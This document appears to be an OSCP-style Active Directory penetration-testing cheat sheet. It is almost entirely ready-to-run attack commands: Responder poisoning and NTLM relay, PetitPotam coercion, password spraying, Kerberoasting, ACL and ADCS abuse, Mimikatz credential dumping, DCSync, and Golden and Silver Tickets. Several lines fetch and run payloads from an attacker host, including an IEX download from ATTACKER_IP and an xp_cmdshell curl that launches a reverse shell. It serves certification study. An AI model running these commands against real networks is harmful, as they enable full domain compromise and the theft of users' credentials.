---
tags:
  [
    ad,
    windows,
    domain-env,
    no-creds,
    got-creds,
    got-shell-windows,
    lateral,
    privesc,
    kerberoast,
    bloodhound,
    responder,
    relay,
    spray,
  ]
---

# Active Directory

> Treat AD as: enumerate → find path → exploit → repeat.
> Always run the Windows privesc checklist alongside AD enumeration.

> **Chains:** New subnet/NIC found → [07_pivoting.md](./07_pivoting.md) | **Creds found → shell check → Phase 3 (BloodHound) FIRST → follow paths** | Local admin on machine → dump LSASS → Phase 6 lateral movement | Domain Admin reached → [00_master_checklist.md Phase 7](./00_master_checklist.md)

---

## Navigation Map — Read This First

> Use this to decide where to go next. Don't read phases sequentially — jump to the right one.

| Situation                  | Next action                                                                | Go to               |
| -------------------------- | -------------------------------------------------------------------------- | ------------------- |
| No creds                   | Responder + null sessions + kerbrute simultaneously                        | Phase 1, 1b, 1c     |
| Got usernames, no password | Blank spray → AS-REP roast → username spray                                | Phase 1c            |
| **Got valid creds**        | **Shell check → BloodHound → ADCS → follow BloodHound paths → Kerberoast** | **Phase 1c gate ↓** |
| BloodHound shows ACL path  | Execute the chain (GenericAll / gMSA / LAPS / WriteDACL)                   | Phase 5             |
| ADCS CA confirmed          | `certipy find -vulnerable` → ESC1 / ESC4 / ESC8                            | Phase 5b            |
| Got a shell anywhere       | Priv check → credential hunting → new subnets                              | "Got a Shell" ↓     |
| Local admin on a machine   | LSASS dump → PTH across subnet                                             | Phase 6             |
| Domain Admin reached       | DCSync → all hashes → Golden Ticket                                        | Phase 7, 8          |

---

## Phase 1 — Initial Enumeration (No Credentials)

```bash
# SMB / RPC null sessions
enum4linux-ng $DC_IP
rpcclient -U "" -N $DC_IP
nxc smb $DC_IP

# RID brute force — enumerate users via null or guest session (works when LDAP is locked down)
nxc smb $DC_IP -u '' -p '' --rid-brute          # null session
nxc smb $DC_IP -u 'guest' -p '' --rid-brute     # guest session (try if null fails)
# Filter output to real user accounts (exclude machine accounts ending in $):
grep "SidTypeUser" rid_output.txt | grep -v '\$' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt

# LDAP anonymous
ldapsearch -H ldap://$DC_IP -x -b "" -s base namingContexts
ldapdomaindump -u '' $DC_IP

# Kerbrute — username enumeration → save to users.txt for later steps
kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute_users.txt
grep "VALID" kerbrute_users.txt | awk '{print $NF}' | cut -d'@' -f1 > users.txt

# AS-REP Roasting — use users.txt from any of the above
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
# Note: -request with no user list needs authenticated LDAP — silently fails on hardened DCs
```

Crack AS-REP hashes:

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

---

## Phase 1b — Responder: Relay vs Capture

Run this alongside initial enumeration. Start Responder immediately — it's passive until something triggers auth.

```bash
# Decision: can you relay, or must you capture?
nxc smb 192.168.x.0/24 --gen-relay-list targets.txt
# targets.txt non-empty  → RELAY MODE (get a shell or dump directly)
# targets.txt empty       → CAPTURE MODE (collect hashes, crack offline)
```

### Relay Mode (targets.txt non-empty)

```bash
# Step 1: Disable SMB and HTTP in Responder so it poisons but doesn't consume the auth
# /etc/responder/Responder.conf → SMB = Off, HTTP = Off

# Step 2: Start Responder to poison name resolution
sudo responder -I tun0 -dwv

# Step 3: Relay incoming auth to targets
impacket-ntlmrelayx -tf targets.txt -smb2support

# Get an interactive SMB shell:
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# then: nc 127.0.0.1 11000

# Execute a reverse shell directly:
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_payload>"
```

> Relay hit → check if relayed user is local admin → if yes, secretsdump immediately:
> `impacket-secretsdump $DOMAIN/user@$TARGET -hashes :NTLM_HASH`

### Capture Mode (all hosts enforce SMB signing)

```bash
# Leave /etc/responder/Responder.conf defaults: SMB = On, HTTP = On
sudo responder -I tun0 -dwv
# Hashes appear as NTLMv2 — crack them:
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
# Then spray the cracked plaintext password (→ Phase 1c)
```

### Coercion Attacks (force a machine to authenticate to you)

**Look for:** You have credentials but nothing is triggering auth naturally. Coercion forces a target machine to send its NTLM authentication to your listener — feeding straight into capture or relay.

**What to watch for:** Print Spooler service running (`sc query spooler`), or any unpatched Windows 2019/2022 DC for PetitPotam.

```bash
# PrinterBug / SpoolSample — requires valid domain creds, targets Print Spooler
# Google: "printerbug.py" / "SpoolSample coerce authentication"
python3 printerbug.py $DOMAIN/user:password@$TARGET $ATTACKER_IP
# $TARGET machine authenticates to $ATTACKER_IP → captured by Responder or relayed

# PetitPotam — abuses EfsRpc, sometimes works without creds on unpatched systems
# Google: "PetitPotam NTLM relay" / "topotam PetitPotam"
python3 PetitPotam.py $ATTACKER_IP $TARGET                          # unauthenticated
python3 PetitPotam.py -u user -p password $ATTACKER_IP $TARGET      # authenticated

# Combine with relay or capture:
# Start ntlmrelayx / Responder FIRST, then trigger coercion
# The machine account hash (MACHINENAME$) comes back — relay it or crack it
# Machine account → Silver Ticket if cracked
```

**Google:** `coerce authentication AD NTLM relay` / `PetitPotam relay ntlmrelayx`

---

## Phase 1c — Password Spraying

> **Check lockout policy before spraying anything. Locking out accounts on the exam is unrecoverable.**

```bash
# Step 0: Check lockout policy
nxc smb $DC_IP -u '' -p '' --pass-pol            # unauthenticated
nxc smb $DC_IP -u user -p password --pass-pol    # authenticated
# "Account lockout threshold: 0" → spray freely
# Any other number → spray ONE password per user, then stop and wait the observation window

# Kerbrute spray (Kerberos-based, less noisy in event logs)
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123'

# nxc spray — one password, all users
nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success

# nxc spray — paired list (one password per user, safe against lockout)
nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

**OSCP password list — try in this order:**

```
<blank string as a password>
Password123
Password1
Welcome1
Welcome123
Summer2024 / Winter2024 / Spring2024 / Fall2023  (current and prior season)
<DomainName>1  / <DomainName>123
<username>     (username == password — try for every account)
```

> **Got a hit — work through this priority order. Do NOT jump to Kerberoasting or ADCS before completing steps 1 and 2.**
>
> 1. **Shell check** — `nxc smb/winrm/rdp $DC_IP -u user -p pass` — if `Pwn3d!` anywhere, stop and pivot there immediately
> 2. **BloodHound** (Phase 3) — run before any other enumeration; it maps every attack path from where you stand
> 3. **ADCS** (Phase 5b) — `certipy find -vulnerable` — high-value path that doesn't require a shell
> 4. **Follow BloodHound paths** (Phase 5) — ACL chains, gMSA, LAPS, anything with a clear route to DA
> 5. **Kerberoast** (Phase 4) — start it alongside BloodHound but don't block on it; it needs offline cracking time

**Edge case — `STATUS_PASSWORD_MUST_CHANGE`:** Account exists but was never activated by the user. Standard tools (`smbpasswd -r`, `rpcclient setuserinfo2`, `net rpc password`) all fail because they can't authenticate at all when this flag is set. Use impacket's `smbpasswd.py` which handles null-session password change:

```bash
# Old password is blank — nothing between : and @
smbpasswd.py '$DOMAIN/username:@$DC_IP' -newpass 'NewPassword1!'

# Set your own new password (pick something meeting complexity requirements)
# The account is then fully usable with the new password
```

---

## Phase 2 — Enumeration With Credentials

```powershell
# Native commands
net user /domain
net group /domain
net group "Domain Admins" /domain
net accounts /domain

# PowerView (import module first)
Import-Module .\PowerView.ps1

Get-NetDomain
Get-NetDomainController
Get-NetUser | Select SamAccountName,Description,MemberOf
Get-NetGroup -GroupName "Domain Admins" | Select Member
Get-NetComputer | Select Name,OperatingSystem
Get-NetUser -SPN | Select SamAccountName,ServicePrincipalName  # Kerberoastable accounts
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs          # ACLs
Find-LocalAdminAccess                                            # Machines where current user is local admin
Get-NetSession -ComputerName DC01                               # Who is logged in where
```

```bash
# From Linux with credentials (nxc = netexec, new name for crackmapexec on Kali 2024+)
nxc smb $DC_IP -u user -p password --users
nxc smb $DC_IP -u user -p password --groups
nxc smb $DC_IP -u user -p password --shares
impacket-GetADUsers $DOMAIN/user:password -dc-ip $DC_IP -all
```

### AS-REP Roasting (authenticated — more reliable than unauthenticated)

With valid creds you query LDAP directly — no wordlist needed, catches every vulnerable account:

```bash
impacket-GetNPUsers $DOMAIN/user:password -dc-ip $DC_IP -request -format hashcat -outputfile asrep.txt
# -request with valid creds queries LDAP for ALL accounts with pre-auth disabled
# Much more reliable than the unauthenticated version in Phase 1
```

### SMB Share Hunting

Finding a readable share is only half the job — know what to look for inside it:

```bash
# Spider a specific share for interesting files
nxc smb $DC_IP -u user -p password -M spider_plus --share ShareName

# Manual — connect and search for credential files
smbclient //$DC_IP/ShareName -U "$DOMAIN/user%password"
# Inside: recurse ON; ls; get filename

# Patterns to look for:
# *.config, *.xml, *.ini, web.config, .sqlconfig, *.txt with "pass" or "cred"
# Any file modified recently (mtime) — suggests active service config
# Writable shares → can stage files for relay or coercion (→ Phase 1b)
```

### Find Where You Have Local Admin (run this immediately after getting creds)

```bash
# (Pwn3d!) in output = local admin on that host
nxc smb 192.168.x.0/24 -u user -p password
nxc smb 192.168.x.0/24 -u user -H NTLM_HASH

# Test local Administrator account specifically across subnet
nxc smb 192.168.x.0/24 -u Administrator -H NTLM_HASH --local-auth
```

> Local admin on a machine → dump LSASS → likely get DA credentials cached there.

### GPP / cpassword (Group Policy Preferences)

Any authenticated domain user can read SYSVOL. GPP used to store encrypted passwords — the key was published by Microsoft.

```bash
# From Linux — search SYSVOL for cpassword
nxc smb $DC_IP -u user -p password -M gpp_password
nxc smb $DC_IP -u user -p password -M gpp_autologin

# Manual search
find //<DC_IP>/sysvol -name "*.xml" 2>/dev/null | xargs grep -i cpassword 2>/dev/null

# Decrypt found cpassword hash
gpp-decrypt <cpassword_value>
```

```powershell
# From Windows
findstr /S /I cpassword \\$DOMAIN\sysvol\$DOMAIN\Policies\*.xml
Get-GPPPassword  # PowerSploit
```

---

## Phase 3 — BloodHound Collection

> **MANDATORY: Run this before Kerberoasting, before Certipy, before any other post-credential work. BloodHound is the map — everything else is following the map. The gMSA chain, LAPS passwords, ACL paths — none of that is visible until BloodHound runs.**

```powershell
# SharpHound on Windows target
.\SharpHound.exe -c All --zipfilename loot.zip
.\SharpHound.exe -c All,GPOLocalGroup

# PowerShell version
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
```

```bash
# bloodhound-python from Linux (no agent needed)
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All
bloodhound-python -u user -p password -d $DOMAIN -dc $DC_IP -c All --zip
```

```bash
# Start BloodHound
sudo neo4j start
bloodhound
# Import zip, then follow this workflow:
```

**Step 1 — Mark every compromised account and machine as Owned**

```
Right-click node → "Mark as Owned"
Do this for every account and machine you control.
```

**Step 2 — Run these queries in order**

```
Analysis → Pre-Built Queries:
1. Find Shortest Paths to Domain Admins          ← always run first
2. Shortest Paths from Owned Principals          ← YOUR path from where you stand
3. Find Computers where Domain Users are LA      ← easy lateral move entry
4. Find Computers where Domain Users can RDP
5. Find Kerberoastable Users
6. Find AS-REP Roastable Users
7. Find Principals with DCSync Rights            ← check if you already have this
```

**Step 3 — Read every node you land on**

```
Click node → Node Info panel:
- Outbound Object Control  → ACLs this user has over other objects
- Local Admin Rights       → machines this user can admin
- Reachable High Value     → shortest path to DA from this node
- Sessions                 → who is currently logged into this machine
```

---

## Phase 4 — Kerberoasting

```bash
# From Linux
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request -outputfile kerberoast.txt

# From Windows (Rubeus)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

---

## Phase 5 — ACL Abuse

Common abusable ACLs found in BloodHound:

| ACL                      | On       | Abuse                                    |
| ------------------------ | -------- | ---------------------------------------- |
| `GenericAll`             | user     | Force password reset                     |
| `GenericAll`             | group    | Add yourself to group                    |
| `GenericWrite`           | user     | Write SPN → Kerberoast                   |
| `ForceChangePassword`    | user     | Reset password without knowing current   |
| `WriteOwner`             | any      | Change owner → grant yourself GenericAll |
| `WriteDACL`              | any      | Grant yourself DCSync or GenericAll      |
| `DCSync` (GetChangesAll) | domain   | Dump all hashes                          |
| `AddSelf`                | group    | Add yourself to the group                |
| `ReadLAPSPassword`       | computer | Read local admin password from AD        |
| `ReadGMSAPassword`       | computer | Read gMSA account's NTLM hash            |

### From Windows (PowerView)

```powershell
# Force password reset (GenericAll / ForceChangePassword on user)
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Add to group (GenericAll / AddSelf on group)
Add-DomainGroupMember -Identity "Domain Admins" -Members $env:USERNAME

# Write SPN → Kerberoast (GenericWrite on user)
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='fake/spn'}
Get-DomainSPNTicket -SPN 'fake/spn'

# Read LAPS password (ReadLAPSPassword on computer)
Get-DomainComputer target_host -Properties ms-mcs-admpwd
```

### From Linux (bloodyAD / rpcclient — no Windows shell needed)

```bash
# Force password reset (GenericAll / ForceChangePassword)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!'

# Via rpcclient (no extra tools)
rpcclient $DC_IP -U "$DOMAIN/user%password" -c "setuserinfo2 target_user 23 'NewPass123!'"

# Add yourself to a group (GenericAll / AddSelf on group)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP add groupMember "Domain Admins" attacker_user

# Read LAPS password
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd

# Read gMSA password hash (ReadGMSAPassword on a computer/service account)
# Step 1: Add yourself to the group that has ReadGMSAPassword (if needed via GenericAll on that group)
bloodyAD --host $DC_IP -d $DOMAIN -u user -p 'password' add groupMember "target_group" user
# Step 2: Read the gMSA hash (re-auth with new group membership first)
nxc ldap $DC_IP -u user -p 'password' --gmsa
# Hash returned as NT hash → use with evil-winrm or PTH
evil-winrm -i $DC_IP -u 'gmsa_account$' -H <NT_HASH>

# Write SPN → Kerberoast (GenericWrite on user)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set object target_user servicePrincipalName -v 'fake/spn'
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request
```

> After every ACL exploit: spray the new credential/hash immediately across all hosts, then re-run BloodHound with the new account marked as Owned.

---

## Phase 5b — ADCS (Active Directory Certificate Services)

**When to run:** Any time LDAP cert issuer shows a CA name (e.g. `sendai-DC-CA`) or `certsrv` is referenced. Always run Certipy once you have valid domain creds — before assuming you need a shell for privesc.

```bash
# Enumerate all templates and flag vulnerable ones
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -vulnerable -stdout

# If nothing flagged, dump all templates to inspect manually
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -stdout
```

**What to look for in output:**

- `Web Enrollment: Enabled` → ESC8 candidate (NTLM relay to ADCS)
- `User Specified SAN: Enabled` → ESC6 (any user can request cert as anyone)
- Templates where low-priv accounts appear in `Enrollment Rights` AND `Enrollee Supplies Subject: True` AND `Client Authentication: True` → ESC1
- Templates where your account/group has `Full Control`, `Write Owner`, or `Write DACL` → ESC4

---

### ESC1 — Enrollee Supplies Subject

Conditions: template has Client Auth EKU + `Enrollee Supplies Subject: True` + low-priv enrollment rights.

```bash
# Request cert as Administrator (specify UPN in SAN)
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -ca 'CA-NAME' -template 'VulnerableTemplate' -upn Administrator@$DOMAIN

# Authenticate with the cert → get NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
# Returns NTLM hash → PTH with evil-winrm or impacket
evil-winrm -i $DC_IP -u Administrator -H <NT_HASH>
```

---

### ESC4 — Writable Template ACL

Conditions: your account/group has `Full Control`, `Write Owner`, or `Write DACL` on a template.

```bash
# Step 1: Save current template config (to restore later)
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -template 'TargetTemplate' -save-old

# Step 2: Overwrite template with ESC1-vulnerable config
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -template 'TargetTemplate' -write-default-configuration

# Step 3: Request cert as Administrator (now ESC1 applies)
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -ca 'CA-NAME' -template 'TargetTemplate' -upn Administrator@$DOMAIN

# Step 4: Auth with cert → get NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# Step 5: Restore template (clean up)
certipy template -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -template 'TargetTemplate' -configuration TargetTemplate.json
```

---

### ESC8 — NTLM Relay to ADCS Web Enrollment

Conditions: `Web Enrollment: Enabled` (HTTP or HTTPS).

```bash
# Relay incoming NTLM auth to ADCS web enrollment → get DC cert
impacket-ntlmrelayx -t http://$DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Then coerce DC auth (PetitPotam / PrinterBug) to trigger relay
python3 PetitPotam.py $ATTACKER_IP $DC_IP

# Convert resulting cert to usable format and auth
certipy auth -pfx dc.pfx -dc-ip $DC_IP
```

---

## Phase 6 — Lateral Movement

### Tool Selection (try in this order)

| Tool         | Shell as    | Needs                     | Notes                                       |
| ------------ | ----------- | ------------------------- | ------------------------------------------- |
| `evil-winrm` | admin-level | 5985/5986 open            | Best interactive shell — try first          |
| `wmiexec.py` | admin-level | 135 + dynamic             | Semi-interactive, quiet                     |
| `smbexec.py` | SYSTEM      | 445                       | No binary on disk                           |
| `psexec.py`  | SYSTEM      | 445, writable admin share | Noisy — creates a service, often AV-flagged |
| `atexec.py`  | admin       | 445 + task scheduler      | Single command only                         |

Rule: try `evil-winrm` → `wmiexec` → `smbexec` → `psexec` in that order.

### Pass the Hash

```bash
# From Linux
evil-winrm -i $TARGET -u Administrator -H NTLM_HASH
crackmapexec smb $TARGET -u Administrator -H NTLM_HASH
impacket-psexec Administrator@$TARGET -hashes :NTLM_HASH
impacket-wmiexec Administrator@$TARGET -hashes :NTLM_HASH
impacket-smbexec Administrator@$TARGET -hashes :NTLM_HASH

# Spray hash across subnet
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth
```

### Pass the Ticket

```powershell
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Import ticket (Rubeus)
.\Rubeus.exe ptt /ticket:admin.kirbi

# Verify
klist
```

```bash
# Pass the Ticket from Linux (impacket)
# Step 1: Request a TGT and save to .ccache
impacket-getTGT $DOMAIN/user:password -dc-ip $DC_IP
impacket-getTGT $DOMAIN/user -hashes :NTLM_HASH -dc-ip $DC_IP   # with hash

# Step 2: Export and use the ticket
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/user@target -k -no-pass
impacket-wmiexec $DOMAIN/user@target -k -no-pass
impacket-smbclient $DOMAIN/user@target -k -no-pass
impacket-secretsdump $DOMAIN/user@target -k -no-pass
```

### Overpass the Hash

```powershell
# Mimikatz
sekurlsa::pth /user:Administrator /domain:$DOMAIN /ntlm:NTLM_HASH /run:powershell.exe

# Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
```

---

## Got a Shell — Now What?

Run this checklist on every new shell (WinRM, psexec, smb exec, RDP). Don't free-roam — work the list.

### 1. Situational awareness

```powershell
whoami /all                    # privileges + group memberships
net localgroup Administrators  # who else is local admin here
ipconfig /all                  # additional subnets → [07_pivoting.md] if new NIC found
netstat -ano                   # internal listening ports (MSSQL 1433, etc.) → Chisel if needed
```

### 2. Check for instant SYSTEM (SeImpersonate)

```powershell
whoami /priv
# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is listed → Potato attack → SYSTEM
# GodPotato:     .\GodPotato.exe -cmd "cmd /c whoami"
# PrintSpoofer:  .\PrintSpoofer.exe -i -c cmd
```

### 3. Credential hunting

```powershell
# Autologon / service credentials in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU /s /f password 2>nul
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f password 2>nul

# Config files — web configs, ini files, anything with creds
dir /s /b *pass* *cred* *config* *.ini *.cfg *.xml 2>nul
type C:\inetpub\wwwroot\web.config 2>nul

# Stored Windows credentials
cmdkey /list
```

### 4. If the shell is on a DC

```bash
# NTDS remotely (if you have creds — no shell needed for this)
impacket-secretsdump $DOMAIN/user:password@$DC_IP

# NTDS locally (requires DA or SYSTEM on DC)
# In shell:
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
# Then from attacker:
impacket-secretsdump -ntds "C:\Temp\ntds\Active Directory\ntds.dit" -system C:\Temp\ntds\registry\SYSTEM LOCAL
```

> After finding new credentials: spray them across all hosts immediately with `nxc smb`, re-mark new accounts as Owned in BloodHound, re-run "Shortest Paths from Owned Principals."

---

## Phase 7 — DCSync (if you have replication rights)

```bash
# From Linux (impacket)
impacket-secretsdump $DOMAIN/user:password@$DC_IP
impacket-secretsdump $DOMAIN/user@$DC_IP -hashes :NTLM_HASH

# Just krbtgt hash (for Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP
```

```powershell
# Mimikatz on target
lsadump::dcsync /domain:$DOMAIN /user:Administrator
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
```

---

## Phase 8 — Golden Ticket

Requires: krbtgt NTLM hash + domain SID

```bash
# Get domain SID from Linux (look for "Domain SID" line in secretsdump output)
impacket-secretsdump $DOMAIN/user:password@$DC_IP | grep "Domain SID"
# Or via lookupsid (RID 0 = domain object)
impacket-lookupsid $DOMAIN/user:password@$DC_IP 0
```

```powershell
# Get domain SID from Windows
Get-DomainSID  # PowerView

# Mimikatz
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt

# Rubeus
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:$DOMAIN /sid:S-1-5-21-... /user:Administrator /ptt
```

---

## Phase 9 — Silver Ticket

Forges a TGS for a **specific service** using that service account's hash — not krbtgt. More targeted and harder to detect than Golden Ticket. Use when you have a service account hash but not krbtgt.

Requires: service account NTLM hash + domain SID + target SPN

```powershell
# Mimikatz
# Common /service values: cifs (file shares), http, mssql, host (RDP/WMI), ldap
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-... /target:SERVER.$DOMAIN /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt

# Verify ticket loaded
klist
# Access the service:
ls \\SERVER.$DOMAIN\C$
```

```bash
# From Linux (impacket)
impacket-ticketer -nthash SERVICE_ACCOUNT_HASH -domain-sid S-1-5-21-... -domain $DOMAIN -spn cifs/SERVER.$DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient $DOMAIN/Administrator@SERVER.$DOMAIN -k -no-pass
impacket-psexec $DOMAIN/Administrator@SERVER.$DOMAIN -k -no-pass
```

---

## MSSQL — From Access to SYSTEM

When you have MSSQL access (via creds, Silver Ticket, or Windows auth), follow this chain:

### Step 1 — Connect

```bash
# From Linux
mssqlclient.py -windows-auth $DOMAIN/user:password@$TARGET        # Windows auth
mssqlclient.py -windows-auth $DOMAIN/user@$TARGET -hashes :HASH   # PTH
mssqlclient.py $TARGET -U sqlsvc -P 'password'                    # SQL auth

# From Windows shell (Windows auth = current user context)
sqlcmd -S localhost -E -Q "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"
```

### Step 2 — Escalate to sysadmin via impersonation

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate a sysadmin (sa is always sysadmin)
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- should return 1

-- REVERT; to drop impersonation when done
```

### Step 3 — Enable xp_cmdshell and execute commands

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Step 4 — SeImpersonatePrivilege → SYSTEM

SQL Server service accounts almost always have `SeImpersonatePrivilege`. Check and exploit:

```sql
EXEC xp_cmdshell 'whoami /priv';
-- If SeImpersonatePrivilege is listed → GodPotato or PrintSpoofer → SYSTEM

-- Upload GodPotato via xp_cmdshell:
EXEC xp_cmdshell 'curl http://ATTACKER_IP/GodPotato.exe -o C:\Windows\Temp\gp.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"';

-- Or trigger a reverse shell as SYSTEM:
EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"';
```

### UNC hash capture (if xp_cmdshell is blocked)

```sql
-- Force SQL Server to authenticate to your listener → capture NTLMv2 hash
-- Start Responder first: sudo responder -I tun0
EXEC xp_dirtree '\\ATTACKER_IP\share';
-- Hash appears in Responder → crack → PTH
```

---

## Credential Dumping

```powershell
# Mimikatz (requires admin/SYSTEM)
privilege::debug
sekurlsa::logonpasswords        # cleartext + hashes from LSASS
sekurlsa::wdigest               # cleartext (if WDigest enabled)
lsadump::sam                    # SAM hashes
lsadump::lsa /patch             # LSA secrets

# Enable WDigest (then wait for user to log in)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# LSASS dump (covert)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Then offline:
# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Or Mimikatz: sekurlsa::minidump lsass.dmp
```

---

## Password Cracking Reference

| Hash Type            | hashcat `-m` | Source                |
| -------------------- | ------------ | --------------------- |
| NTLM                 | `1000`       | secretsdump, SAM dump |
| NTLMv2 (Net-NTLMv2)  | `5600`       | Responder capture     |
| Kerberoast (TGS-REP) | `13100`      | GetUserSPNs           |
| AS-REP Roast         | `18200`      | GetNPUsers            |
| MD5                  | `0`          | Web/DB                |
| SHA1                 | `100`        | Web/DB                |
| bcrypt               | `3200`       | Web/DB                |

```bash
# Standard cracking commands
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# With rules (significantly increases coverage)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john alternative
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ntlm_hashes.txt
```

---

## Common AD Attack Paths

```
No creds (run all of these in parallel)
├── Responder (LLMNR/NBT-NS poisoning) → NTLMv2 hash → crack → spray  ← start immediately
├── NTLM relay → gen-relay-list → ntlmrelayx → shell / secretsdump
├── LDAP anonymous → user list → AS-REP roast → crack → spray
├── SMB null session → user list → password spray
└── Kerbrute userenum → users.txt → AS-REP roast + password spray

Low-priv user
├── Check where local admin (nxc smb subnet -u user -p pass)
├── BloodHound → mark as owned → Shortest Paths from Owned Principals   ← run this FIRST
├── Kerberoastable accounts? → request TGS → crack
├── ACL abuse → GenericAll/ForceChangePassword/WriteDACL on any privileged object
│   └── ReadGMSAPassword chain → add self to group → nxc --gmsa → hash → WinRM
├── ADCS present? → certipy find -vulnerable → ESC1/ESC4/ESC8
│   └── ESC4: writable template → overwrite to ESC1 → cert as Admin → NT hash → shell
├── Can read SYSVOL? → GPP passwords (see Phase 2 → GPP/cpassword)
├── Internal services not exposed externally (MSSQL 1433, etc.)? → Chisel tunnel → [07_pivoting.md]
└── Password spray found creds against all services on all hosts

Admin on non-DC machine
├── Dump LSASS (Mimikatz / procdump) → hashes → PTH to DC
├── SAM dump → local admin hash → spray --local-auth across subnet
└── Kerberos tickets → pass-the-ticket

Domain Admin
└── DCSync → all hashes → PTH as Administrator → Golden Ticket (persistence)
```
